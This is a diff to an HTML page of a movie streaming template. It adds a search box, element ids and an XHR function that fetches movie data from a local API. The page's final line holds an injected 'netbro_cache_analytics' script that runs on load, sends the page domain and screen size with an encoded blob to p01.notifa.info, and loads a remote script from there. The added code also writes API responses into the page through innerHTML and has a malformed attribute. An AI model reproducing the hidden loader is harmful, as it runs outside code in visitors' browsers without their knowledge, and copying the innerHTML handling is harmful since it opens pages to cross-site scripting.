@@ -10,7 +10,8 @@
 		
 		<link rel="stylesheet" href="icons/fontawesome/css/fontawesome-all.min.css"><!-- FontAwesome Icons -->
 		<link rel="stylesheet" href="icons/Iconsmind__Ultimate_Pack/Line%20icons/styles.min.css"><!-- iconsmind.com Icons -->
-		
+
+		<script  src="../api/index.js"></script>
 		
 		<title>SKRN - Media Streaming App</title>
 	</head>
@@ -22,7 +23,8 @@
 			
 			<div id="video-search-header">
 				<div id="search-icon-more"></div>
-				<input type="text" placeholder="Search for Movies or TV Series" aria-label="Search">
+				<input type="text" id="search_movie_textbox" placeholder="Search for Movies or TV Series" aria-label="Search">
+				<button type="button"  onclick="searchMovie()" id=search_movie_button" class="btn btn-form">Search</button>
 				<div id="video-search-header-filtering">
 					<form id="video-search-header-filtering-padding">
 						<div class="row">
@@ -129,7 +131,7 @@
 			<div id="header-user-profile">
 				<div id="header-user-profile-click" class="noselect">
 					<img src="images/demo/user-profile.jpg" alt="Suzie">
-					<div id="header-username">Suzie Smith</div><i class="fas fa-angle-down"></i>
+					<div id="header-username"></div><i class="fas fa-angle-down"></i>
 				</div><!-- close #header-user-profile-click -->
 				<div id="header-user-profile-menu">
 					<ul>
@@ -262,7 +264,7 @@
 			</div>
 			
 			<div class="content-sidebar-section">
-				<h2 class="content-sidebar-sub-header">True Blood</h2>
+				<h2 id="movie_title" class="content-sidebar-sub-header">True Blood</h2>
 				<ul class="progression-studios-slider-rating">
 					<li>PG-13</li><li>HD</li>
 				</ul>
@@ -270,17 +272,17 @@
 			
 			<div class="content-sidebar-section">
 				<h4 class="content-sidebar-sub-header">Release Date</h4>
-				<div class="content-sidebar-short-description">2 October, 2017 (USA)</div>
+				<div  id="release_date" class="content-sidebar-short-description">2 October, 2017 (USA)</div>
 			</div><!-- close .content-sidebar-section -->
 			
 			<div class="content-sidebar-section">
 				<h4 class="content-sidebar-sub-header">Length</h4>
-				<div class="content-sidebar-short-description">2 hr 43 min</div>
+				<div id="movie_length" class="content-sidebar-short-description">2 hr 43 min</div>
 			</div><!-- close .content-sidebar-section -->
 			
 			<div class="content-sidebar-section">
 				<h4 class="content-sidebar-sub-header">Director</h4>
-				<div class="content-sidebar-short-description">James Wan</div>
+				<div id="movie_director" class="content-sidebar-short-description">James Wan</div>
 			</div><!-- close .content-sidebar-section -->
 
 			
@@ -491,7 +493,7 @@
 				
 				<div class="movie-details-section">
 					<h2>Storyline</h2>
-					<p>Mae Holland (Emma Watson) seizes the opportunity of a lifetime when she lands a job with the world's most powerful technology and social media company. Encouraged by the company's founder (Tom Hanks), Mae joins a groundbreaking experiment that pushes the boundaries of privacy, ethics and personal freedom. Her participation in the experiment, and every decision she makes soon starts to affect the lives and futures of her friends, family and that of humanity.</p>
+					<p id="movie_summary">Mae Holland (Emma Watson) seizes the opportunity of a lifetime when she lands a job with the world's most powerful technology and social media company. Encouraged by the company's founder (Tom Hanks), Mae joins a groundbreaking experiment that pushes the boundaries of privacy, ethics and personal freedom. Her participation in the experiment, and every decision she makes soon starts to affect the lives and futures of her friends, family and that of humanity.</p>
 				</div><!-- close .movie-details-section -->
 
 				<div class="movie-details-section">
@@ -625,6 +627,43 @@ Thor</a></h6>
 		<script src="js/afterglow.min.js" defer></script><!-- Video Player JS Plugin -->
 		<script src="js/script.js" defer></script><!-- Custom Document Ready JS -->
 		<script src="js/script-dashboard.js" defer></script><!-- Custom Document Ready for Dashboard Only JS -->
+
+		<!-- Retrieve localStorage -->
+
+		<script src="../api/index.js">
+			window.onload = function (){
+				document.getElementById("header-username").innerHTML = localStorage.getItem('username')
+			}
+
+		</script>
+
+		<!--CRUD Scripts -->
+
+
+		<script>
+
+			function searchMovie() {
+				title = document.getElementById("search_movie_textbox").value;
+				var url = "http://localhost:3000/api/movies/"+title;
+				var xhr = new XMLHttpRequest();
+				xhr.open('GET', url, true);
+				xhr.onload = function () {
+					var response = JSON.parse(xhr.responseText);
+					if(xhr.readyState==4 && xhr.status=="200"){
+						alert('Movie found!');
+						document.getElementById("movie_title").innerHTML = response.title;
+						document.getElementById("release_date").innerHTML = response.release_date;
+						document.getElementById("movie_length").innerHTML = response.movie_length;
+						document.getElementById("movie_director").innerHTML = response.director;
+						document.getElementById("movie_summary").innerHTML = response.summary;
+					} else {
+						console.log(response);
+						alert('Movie not found!')
+					}
+				}
+				xhr.send(null);
+			}
+		</script>
 		
 		
 	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXstx%2f11gesA2IINqgUuib2htE646l88688pq4u91g0Tr%2fbMhJp9fSdYpUj66zivXlWWTVWkLdOirFCNEMndEIY2dsrh08JWPFAidyJT8dXhQgZWfdBobWt%2fjhKjKprt5sbNENpeXwntS5Kh5J%2bRhsCIA4SWVRi0aas7r5juqik1K2UADAeEswTGjZePJckHaAL4tX2erltS%2f3Oz400HO6b4Ea1nmXOtVHTHyMyc3wXtyCNoMQsoyOUhLX%2fVhsBczT0GTQIYuif228y%2bzmvFrE7mAQ9aBVfyVvcE%2f0tOWDjNConGAGO8yaPJ0RqMVCWef7FTvywDrGdRD9nNzYHj46CPKGxR9dH4H6%2b07APjHJaJZNbo%2bLSjJOem%2bJrWedy6Lsl%2fhpB7hwTc13GykbNq4M71JroZY0hhgMYOeSPWYMD%2fJw0U2oW%2bcyLhUZ9SU%2brrgro0%2bZ%2ftB5itL5XeRR3jKK8e323emlZQPqE4K7GoKnJKM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
